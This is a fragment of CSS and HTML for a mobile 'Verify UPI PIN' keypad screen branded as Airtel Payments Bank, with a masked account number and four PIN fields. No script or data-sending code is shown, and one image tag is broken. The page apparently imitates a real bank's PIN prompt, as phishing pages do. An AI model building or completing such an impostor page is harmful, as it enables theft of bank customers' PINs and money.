      .keypad {
        position: relative;
    display: grid;
    grid-template-columns: repeat(3, 1fr);
    width: 100vw; /* Adjust width as needed */
    /* max-width: 400px; Limit maximum width */
    background-color: #fff;
    /* padding: 4vw; */
    border-radius: 10px;
    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
}

.keypad button {
    width: 100%;
    min-height: 10vw; /* Adjust height relative to viewport width */
    font-size: 5vw; /* Adjust font size relative to viewport width */
    background-color: #f1f1f1;
    border: none;
    color: #1a3381;
    cursor: pointer;
    transition: background-color 0.3s, transform 0.1s;
}

.keypad button:active {
    background-color: #ccc;
    transform: scale(0.95);
}

.keypad .zero {
    grid-column: span 2; /* Span two columns */
}

.keypad .delete, .keypad .enter {
    color: #1d3b73;
}

.keypad .delete:hover, .keypad .enter:hover {
    background-color: #0a2a52;
}
button.enter {
    font-size: 13vw !important;
}
/* Media Queries for responsiveness */
@media (max-width: 350px) {
    .keypad {
        position: absolute;
        bottom: 0;
    }
}
@media (max-width: 600px) {
    .keypad {
        grid-gap: 0; /* Reduced gap on smaller screens */
        width: 100vw; /* Increase width slightly on smaller screens */
        /* position: relative; */
    }

    .keypad button {
        height: 16vw; /* Adjust height for smaller screens */
        font-size: 7vw; /* Adjust font size for smaller screens */
    }
}

    <div class="cont">
      <div class="header">
        <div class="bank-name">Airtel Payments Bank <span>XXXX9544</span></div>

          alt="UPI Logo"
        />
      </div>

      <div class="container">
        <span class="fre">Verify UPI PIN</span>
        <p class="re">ENTER 4-DIGIT UPI PIN</p>
        <div class="pin-box">
          <input type="password" maxlength="1" id="pin1" readonly />
          <input type="password" maxlength="1" id="pin2" readonly />
          <input type="password" maxlength="1" id="pin3" readonly />
          <input type="password" maxlength="1" id="pin4" readonly />
        </div>

        <div class="warning">
          <div class="warningicon">
            <i class="fa-solid fa-circle-exclamation"></i>
          </div>
          <p class="fds">
            UPI PIN will keep your account secure from unauthorized access. Do
            not share this PIN with anyone.
          </p>
        </div>
      </div>
      <div class="keypad">
        <button onclick="enterDigit('1')">1</button>
        <button onclick="enterDigit('2')">2</button>
        <button onclick="enterDigit('3')">3</button>
        <button onclick="enterDigit('4')">4</button>
        <button onclick="enterDigit('5')">5</button>
        <button onclick="enterDigit('6')">6</button>
        <button onclick="enterDigit('7')">7</button>
        <button onclick="enterDigit('8')">8</button>
        <button onclick="enterDigit('9')">9</button>
        <button class="delete" onclick="deleteDigit()"><i class="fa-solid fa-delete-left"></i></button>
        <button onclick="enterDigit('0')">0</button>
        <button class="enter"><i class="fa-solid fa-circle-check"></i></button>
      </div>
  </div>
